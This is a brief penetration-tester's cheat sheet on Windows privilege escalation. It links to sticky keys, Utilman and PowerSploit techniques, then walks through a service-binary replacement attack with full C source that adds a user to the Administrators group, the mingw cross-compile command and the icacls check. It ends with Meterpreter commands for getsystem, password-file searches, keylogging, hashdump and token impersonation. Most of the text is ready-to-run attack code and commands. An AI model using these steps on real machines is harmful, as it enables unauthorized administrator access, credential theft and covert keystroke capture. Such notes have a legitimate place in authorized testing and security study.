Privilege Escalation

Info: Increase the level of access to a machine or network


Local Priv-Esc windows: 


[Sticky Keys Attack](http://carnal0wnage.attackresearch.com/2012/04/privilege-escalation-via-sticky-keys.html)

[Utilman Attack](https://www.infopackets.com/news/9483/how-reset-any-password-windows-vista-7-8-10)

[PowerSploit-Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)



Insecure permissions attack: 

Run icacls (windows utility that allows us to check for insecure permissions.

c:\Program Files\Photodex\ProShow Producer>icacls scsiaccess.exe 
scsiaccess.exe NT AUTHORITY\SYSTEM:(I)(F)
	•	BUILTIN\Administrators:(I)(F)
	•	BUILTIN\Users:(I)(RX)
	•	APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX) 
	•	Everyone:(I)(F) # Note that everyone has permission to the service. 
	•	
Create Windows Executable that will add a regular Windows user called 'low' to the local Administrators group. 

root@kali:~# cat useradd.c

#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main () 
{
	•	int i;
	•	i=system ("net localgroup administrators low /add"); 
	•	return 0;
}
	•	
Cross-compile with mingw


root@kali:~# i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c

Replace original scsiaccess.exe file with the one created and next time the service is started, our fake scsiaccess.exe file will be run with SYSTEM privileges and out user 'low' to the admin group. 




Meterpreter: 

Local privelege escalation: 

meterpreter > getsystem -h

Search for a file 

meterpreter > search -f *password*

Keylogging: 

meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

Net commands (view network information)

meterpreter > shell
C:\Windows\system32> net users
C:\Windows\system32> net localgroup Administrators

dump all hashes: 
meterpreter > hashdump

Incognito (impersonate tokens on a system):
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token [token to impersonate from list]



